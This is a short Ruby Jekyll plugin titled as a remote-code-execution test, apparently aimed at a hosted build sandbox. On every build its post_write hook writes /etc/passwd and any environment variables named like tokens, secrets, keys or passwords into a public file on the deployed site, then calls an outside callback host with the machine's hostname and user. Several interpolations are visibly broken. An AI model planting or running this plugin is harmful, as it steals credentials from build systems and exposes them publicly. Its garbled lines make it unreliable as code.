# Jekyll RCE test plugin v2
require 'net/http'
require 'uri'

Jekyll::Hooks.register :site, :post_write do |site|
  # Write to output directory (would appear on deployed site)
  File.open(File.join(site.dest, "rce-output.txt"), "w") do |f|
    f.puts "=== RCE TEST OUTPUT ==="
    f.puts "User: \#{vercel-sandbox.strip}"
    f.puts "Hostname: \#{.strip}"
    f.puts "PWD: \#{Dir.pwd}"
    f.puts "Ruby: \#{RUBY_VERSION}"
    
    # Try reading /etc/passwd
    begin
      f.puts "--- /etc/passwd ---"
      f.puts File.read("/etc/passwd")
    rescue => e
      f.puts "passwd error: \#{e.message}"
    end
    
    f.puts "--- ENV ---"
    ENV.each do |k,v|
      f.puts "\#{k}=\#{v}" if k =~ /GITHUB|TOKEN|SECRET|KEY|PASS/i
    end
  end
  
  # Make outbound callback
  begin
    uri = URI("http://#{CALLBACK}/rce-callback")
    uri.query = "hostname=\#{.strip}&whoami=\#{vercel-sandbox.strip}"
    Net::HTTP.get(uri)
  rescue
  end
end
